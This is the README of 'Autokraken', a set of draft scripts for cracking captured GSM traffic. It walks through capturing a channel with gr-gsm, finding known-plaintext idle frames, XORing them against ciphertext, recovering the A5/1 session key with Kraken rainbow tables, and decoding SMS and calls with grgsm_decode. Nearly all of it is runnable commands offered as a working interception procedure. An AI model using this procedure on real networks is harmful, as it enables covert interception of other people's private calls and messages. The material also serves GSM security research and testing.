# Autokraken

_Warning: those are currently dirty drafts.  It works for us but would need to be heavily reviewed to work any other platform._

A set of scripts to automate the cracking of captured GSM/G2 network traffic with Kraken, and to extract SMS and voice calls out of it.  This is not frequency hopping capable.

## Requirements

Few command line utilities

        which sed
        which awk
        which grep
        which cut
        which wc

Few packages for stage 1

        apt install python3 tcpdump tshark gr-gsm -y

Optionally `gsmframedecoder` when dealing with SI5,6 instead of idling frames, but then you would also need the legacy Airprobe code to get the HEX version of the bursts

And of course Kraken with ready to serve rainbow table indexes

## Introduction

You can separate stage 0,1 and 2 for resp. capturing and cracking.  Simply send the bitstring file from the former to the latter and proceed.

## Stage 0 - capture and get the cfile(s) ready

	arfcn=

	./capture.bash $arfcn

## Stage 1 - define known plain-text frame

_requires GR-GSM and a cfile_

Extract 0C and find out about the SDCCH timeslot (TODO: and subchannel)

        cfile=/root/capture/$arfcn.cfile

        cd /root/KRAKEN/autokraken/stage1/
	./json0C $arfcn
	./parse.py 0C $cfile.0C.json

	slot=1

Look for idling frames around the Ciphering Mode Command

	./jsonXS $arfcn $slot

If you don't find the CMC it might be because there's hopping going on.  Look closer at the IA and hopping friends in SI1.

Now seek for the last known idle frame

	./parse.py XS $cfile.${slot}S.json

	plainframe=

Also have a look at Timing Advance in case it is not `x00` already.

Eventually send the bitstring file to the Kraken server.

	scp $cfile.${slot}S kraken:/root/capture/

## Stage 2 - define the cipher-text frames

_requires Kraken and the bitstring file_

	screen -S KRAKEN
	cd /root/KRAKEN/autokraken/stage2/
	string=/root/capture/$arfcn.cfile.1S
	echo $plainframe

Tune your path against Kraken and Utilities

        vi feedcrack.conf

	kraken=/root/KRAKEN/kraken

XOR plain bitstrings with cipher bitstrings

	#./getemptyframeplain $cfile.${slot}S $plainframe
	#./getemptyframecipher $cfile.${slot}S $plainframe
	./feedemptyframe $string $plainframe
	ls -lhF /root/capture/$arfcn.cfile.1S.*.emptyframe*

Feed those into Kraken interactivelty

	ls -lhF /dev/sdb2
	ls -lhF /root/KRAKEN/kraken/indexes/
	head /root/capture/$arfcn.cfile.${slot}S.$plainframe.emptyframe234

	cd /root/KRAKEN/kraken/Kraken/
	./kraken ../indexes

	crack <xored bitstring>

## Stage 2 semi-automated

        cd /root/KRAKEN/kraken/Kraken/
        ./kraken ../indexes < /root/capture/$arfcn.cfile.${slot}S.$plainframe.emptyframe234

## Stage 2 automated

	./crack $cfile.${slot}S $plainframe

## Stage 3 - verify the key

Tune the hardcoded path against Utilities

	cd /root/KRAKEN/autokraken/stage3/
	vi feedkc

	utilspath=/root/KRAKEN/kraken/Utilities

reach back to the previous frame number and xored bitstring to feed the key check

	./feedkc <xored bitstring> /root/capture/$arfcn.cfile.1S.$plainframe.emptyframe1234

COPY/PASTE THE KEY AND @ E.G.

	/root/KRAKEN/kraken/Utilities/find_kc <FOUND KEY> <BITOPS> <BURST FRAME NUMBER> <PREV BURST FRAME NUMBER> <PREV BURST XORED BITSTRING>

## Conclusion

You can now sniff into the ciphered text

	grgsm_decode --cfile=$cfile --arfcn=$arfcn --mode=SDCCH8 --timeslot=$slot --subslot=$sub \
		--a5=1 --kc=KEY-HERE

## Resources

GSM Cracking: SMS w/ Kraken – Software Defined Radio Series #16
https://www.crazydanishhacker.com/gsm-cracking-sms-kraken-software-defined-radio-series-16/

